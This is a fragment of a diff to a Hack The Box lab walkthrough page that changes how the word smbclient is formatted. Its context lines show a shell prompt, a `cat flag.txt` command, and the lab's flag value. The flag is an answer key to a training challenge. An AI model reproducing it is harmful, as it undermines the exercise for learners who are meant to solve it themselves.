 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ cat flag.txt
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>5f61c10dffbc77a704d76016a22f1664</span></span></code></pre></div>
-<p>Since we got everything we needed from the share, we can exit out of the SMB server and the files we downloaded are saved inside the location where we ran our <strong>smbclient</strong> command from.
+<p>Since we got everything we needed from the share, we can exit out of the SMB server and the files we downloaded are saved inside the location where we ran our <code>smbclient</code> command from.
 <br/>
 <br/></p>
 <h5 id="submit-flag">SUBMIT FLAG</h5>
